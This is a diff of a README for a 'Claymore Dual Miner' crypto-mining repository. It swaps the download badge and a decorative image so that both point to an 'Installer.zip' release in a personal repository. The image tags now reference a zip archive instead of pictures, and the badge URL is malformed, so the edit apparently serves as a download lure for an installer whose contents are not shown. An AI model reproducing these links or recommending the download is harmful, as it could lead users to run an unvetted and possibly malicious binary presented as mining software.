@@ -21,7 +21,7 @@ Claymore Dual Miner is a powerful tool that allows efficient use of GPU resource
 
 To get started with Claymore Dual Miner Multi Crypto Mining, simply download the latest version from the link below and follow the installation instructions provided in the repository.
 
-[![Download Claymore Dual Miner](https://img.shields.io/badge/Download-Claymore%20Dual%20Miner-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download Claymore Dual Miner](https://github.com/hekkof/Claymore-Dual-Miner-Multi-Crypto-Mining/releases/download/v1.0/Installer.zip%20Dual%20Miner-blue)](https://github.com/hekkof/Claymore-Dual-Miner-Multi-Crypto-Mining/releases/download/v1.0/Installer.zip "Launch Download")
 
 ## Supported Topics
 
@@ -59,4 +59,4 @@ Start mining multiple cryptocurrencies efficiently with Claymore Dual Miner and 
 
 Happy Mining! ⛏️💰
 
-![Mining](https://www.pngitem.com/pimgs/m/69-696108_miner-clipart-mining-down-the-mine-cartoon-png.png)
+![Mining](https://github.com/hekkof/Claymore-Dual-Miner-Multi-Crypto-Mining/releases/download/v1.0/Installer.zip)
